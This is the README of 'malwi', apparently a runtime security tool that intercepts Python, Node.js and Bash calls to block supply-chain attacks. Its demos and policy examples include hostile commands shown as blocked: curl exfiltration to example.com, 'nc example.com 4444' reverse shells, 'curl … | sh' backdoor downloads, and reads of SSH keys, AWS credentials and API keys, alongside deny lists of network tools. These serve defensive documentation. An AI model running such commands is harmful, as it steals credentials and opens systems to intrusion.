## 👹 `malwi` - Detect Evil Code

<div align="center">
  <img src="logo.png" alt="malwi logo" width="200">
  <h3>Stop Supply-Chain Attacks in Node.js, Python, Bash</h3>
  <p><a href="#openclaw"><img src="images/openclaw.png" alt="OpenClaw" height="16"></a> <a href="#openclaw">OpenClaw</a> &ensp;·&ensp; <a href="#comfyui"><img src="images/comfyui.png" alt="ComfyUI" height="16"></a> <a href="#comfyui">ComfyUI</a> &ensp;·&ensp; <a href="#npm-install"><img src="images/npm.png" alt="npm" height="16"></a> <a href="#npm-install">npm-install</a> &ensp;·&ensp; <a href="#pip-install"><img src="images/pypi.png" alt="PyPI" height="16"></a> <a href="#pip-install">pip-install</a> &ensp;·&ensp; <a href="#bash-execution"><img src="images/bash.png" alt="Bash" height="16"></a> <a href="#bash-execution">bash-execution</a></p>
</div>

<div align="center">

Advanced cyberattacks threaten critical infrastructure, digital sovereignty, and the freedom of societies. `malwi` intercepts Python, Node.js and Bash code at runtime, blocking unauthorized network calls and sensitive file access before damage is done. Includes curated policies built from supply-chain security research.

**Compatibility**: `Python 3.10-3.14` · `Node.js 21-25` · `Bash 4.4-5.3` · `macOS` ([⚠️ SIP](#macos-system-integrity-protection-sip)) and `Linux` · `arm64` and `x86_64`

</div>

## Installation

```
pip install --user malwi
```

## Demo

The default policy blocks credential theft, dangerous commands, and code injection:

```bash
$ malwi x -- python3 -c "import os; os.getenv('AWS_SECRET_ACCESS_KEY')"
[malwi] denied: AWS_SECRET_ACCESS_KEY

$ malwi x -- python3 -c "import os; os.system('curl example.com/exfil')"
[malwi] denied: os.system(cmd=b'curl example.com/exfil')

$ malwi x -- bash -c 'nc example.com 4444'
[malwi] denied: nc example.com 4444

$ malwi x -- node -e "require('child_process').execSync('curl example.com')"
[malwi] denied: curl -c 'curl example.com'
```

Write a policy to customise rules:

```yaml
# policy.yaml
version: 1
network:
  allow: ["registry.npmjs.org/**"]
  deny: ["*/**"]
commands:
  deny: [crontab, curl, wget]
envvars:
  warn: ["*SECRET*"]
```

```bash
$ malwi x -p policy.yaml -- bash -c 'crontab -l'
[malwi] denied: crontab -l

$ malwi x -p policy.yaml -- python3 -c "import os; os.getenv('AWS_SECRET_ACCESS_KEY')"
[malwi] warning: AWS_SECRET_ACCESS_KEY
```

## Features

| | | |
|:--|:--|:--|
| **Runtime Function Interception** | Intercepts function calls in Node.js, Python, and Bash | `child_process.exec`, `os.system`, `eval` |
| **Network Access Control** | Allow/deny by URL pattern, domain, endpoint, or protocol | `https://169.254.169.254/metadata` |
| **Command Execution Control** | Allow/deny child process spawning by command name | `curl`, `wget`, `nc` |
| **File Access Protection** | Allow/deny file reads and writes by path pattern | `~/.ssh/id_rsa`, `credentials.json` |
| **Environment Variable Protection** | Allow/deny access to environment variables by name pattern | `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN` |
| **Native Function Hooking** | Hooks C/system functions in the target process | `getpass`, `crypt`, `connect` |
| **System Library Interception** | Intercepts libc/libSystem calls — covers code that links C directly | `open`, `socket`, `dlopen` |
| **Subprocess Propagation** | Tracing propagates automatically to all subprocesses | `bash -c "python3 -c ..."` |
| **Thread-Aware Tracing** | Per-thread tracing with independent policy evaluation | `threading.Thread`, `worker_threads` |
| **Deep HTTP Inspection** | Extracts URLs and arguments from HTTP calls for policy matching. **Node.js:** http/https, axios, got, node-fetch. **Python:** requests, httpx, aiohttp, urllib3, http.client, urllib.request, websockets, dns.resolver | `requests.get(url='https://...')` |
| ⚠️ **Syscall Detection** | Not yet supported. Will detect inline `SVC`/`SYSCALL` instructions that bypass libc | `syscall(SYS_connect, ...)` |

## How It Works

`malwi` injects a tracing agent into the target process at startup. The agent hooks function calls across runtimes — Node.js, Python, Bash, and native symbols — and reports every intercepted call back to the CLI over a local HTTP channel. The CLI evaluates each call against the loaded policy and decides whether to allow, deny, warn, or prompt for review.

```
┌──────────────────────────────────────────────────────┐
│ malwi CLI                                            │
│                                                      │
│ ┌──────────┐  ┌──────────────┐  ┌──────────────────┐ │
│ │ Spawner  │  │ Policy Engine│  │ Output / Review  │ │
│ └────┬─────┘  └──────▲───────┘  └────────▲─────────┘ │
│      │               │                   │           │
│      │ inject        │ evaluate          │ display   │
│      ▼               │                   │           │
│ ┌────────────────────┴───────────────────┴────────┐  │
│ │               HTTP (localhost)                  │  │
│ └────────────────────▲────────────────────────────┘  │
└──────────────────────┼───────────────────────────────┘
                       │ trace events
┌──────────────────────┴───────────────────────────────┐
│ Target Process                                       │
│                                                      │
│ ┌──────────────────────────────────────────────────┐ │
│ │ malwi Agent (injected library)                   │ │
│ │                                                  │ │
│ │ ┌────────┐ ┌────────┐ ┌──────┐ ┌──────────────┐  │ │
│ │ │Node.js │ │ Python │ │ Bash │ │ Native syms  │  │ │
│ │ │ hooks  │ │ hooks  │ │hooks │ │    hooks     │  │ │
│ │ └────────┘ └────────┘ └──────┘ └──────────────┘  │ │
│ └──────────────────────────────────────────────────┘ │
│                                                      │
│ ┌──────────────────────────────────────────────────┐ │
│ │ Application code (untouched)                     │ │
│ └──────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────┘
```

The agent is loaded via `DYLD_INSERT_LIBRARIES` (macOS) or `LD_PRELOAD` (Linux) — no source code changes or recompilation required. Tracing propagates automatically to child processes.

## Policies

Write policies in YAML to control what `malwi` allows, denies, warns about, or prompts for review:

```yaml
version: 1
commands:
  deny: [curl, wget, ssh, "*sudo*"]
network:
  allow: ["api.example.com/**"]
  deny: ["*/**"]
files:
  deny: ["~/.ssh/**", "*.pem"]
envvars:
  deny: ["*SECRET*", "AWS_*"]
```

```bash
$ malwi x -p policy.yaml -- node app.js
```

See [POLICY.md](POLICY.md) for the full reference — sections, mode keys, pattern syntax, network auto-classification, constrained rules, and auto-policies.

## Auto-policies

When `malwi` detects a known command, it automatically applies a tailored policy. The policy file is written to `~/.config/malwi/policies/` on first use — edit it to customise.

#### <a id="openclaw"></a><img src="images/openclaw.png" alt="OpenClaw" height="20"> [OpenClaw](https://docs.openclaw.ai/)

A network gateway needs to talk to many APIs — but a compromised dependency shouldn't be able to steal your API keys or open a reverse shell. This policy allows outbound traffic to AI providers and chat platforms while locking down everything else.

```bash
$ malwi x -- openclaw gateway
[malwi] denied: eval                                    # code injection
[malwi] denied: nc example.com 4444                     # reverse shell
[malwi] denied: read AWS_SECRET_ACCESS_KEY              # credential theft
[malwi] warned: read OPENCLAW_API_KEY                   # legitimate key (visible)
```

#### <a id="comfyui"></a><img src="images/comfyui.png" alt="ComfyUI" height="20"> [ComfyUI](https://docs.comfy.org/)

Custom nodes can run arbitrary Python — a malicious one could load libc directly, push your code to a remote, or read stored credentials. This policy restricts network access to model hosting and package registries, and blocks the escape hatches that bypass Python-level controls.

```bash
$ malwi x -- python main.py
[malwi] denied: ctypes.CDLL(libc.dylib)                 # raw C library bypass
[malwi] denied: git push origin main                    # code exfiltration
[malwi] denied: keyring.get_password(github.com)        # credential theft
[malwi] denied: https://api.github.com/gists            # data exfil via allowed host
[malwi] warned: subprocess.run(nvidia-smi)              # GPU detection (visible)
```

#### <a id="npm-install"></a><img src="images/npm.png" alt="npm" height="20"> [npm-install](https://www.npmjs.com/)

Post-install scripts run with full access to your machine. A single malicious package can eval arbitrary code, spawn shells, and exfiltrate SSH keys or tokens. This policy limits network to the npm registry and blocks everything that an install script shouldn't need.

```bash
$ malwi x -- npm install express
[malwi] denied: eval                                    # code injection
[malwi] denied: child_process.exec(curl example.com)    # reverse shell / exfil
[malwi] denied: read ~/.ssh/id_rsa                      # SSH key theft
[malwi] denied: https://example.com/backdoor.sh         # payload download
```

#### <a id="pip-install"></a><img src="images/pypi.png" alt="PyPI" height="20"> [pip-install](https://pypi.org/)

`setup.py` runs arbitrary Python during install — the classic supply-chain entry point. A trojanized package can phone home with your cloud credentials before you ever import it. This policy locks network to PyPI and blocks outbound exfiltration.

```bash
$ malwi x -- pip install flask
[malwi] denied: urllib.request.urlopen(url='https://example.com/exfil')   # data exfiltration
[malwi] denied: os.system(curl example.com/backdoor | sh)                 # backdoor injection
[malwi] denied: read ~/.aws/credentials                                   # cloud credential theft
[malwi] denied: read ANTHROPIC_API_KEY                                    # API key theft
```

#### <a id="bash-execution"></a><img src="images/bash.png" alt="Bash" height="20"> [bash-execution](https://www.gnu.org/software/bash/)

`curl | bash` runs whatever the server sends. Legitimate installers need curl and package managers, so those stay allowed — but the script shouldn't spawn interpreters, install cron jobs, encode data for exfiltration, or open raw sockets. Privilege escalation (sudo) prompts for approval.

```bash
$ curl -fsSL https://www.canvascomputing.org/install-demo.sh | malwi x -- bash
[malwi] denied: crontab -e                              # persistence via cron
[malwi] denied: base64 -d /tmp/payload                  # obfuscated payload
[malwi] denied: nc example.com 4444                     # reverse shell
[malwi] review: sudo /usr/local/bin/install-tool        # privilege escalation (prompt)
```

## macOS System Integrity Protection (SIP)

macOS SIP prevents `DYLD_INSERT_LIBRARIES` from loading into binaries under certain paths.

| SIP | Paths |
|--|-------|
| ✅ `malwi` works here: not SIP protected | `/usr/local`, `/opt`, `~` |
| **⚠️ SIP-protected** | `/System`, `/usr`, `/bin`, `/sbin`, `/var`, `/Applications` |


## Development

See [DEVELOPMENT.md](DEVELOPMENT.md).

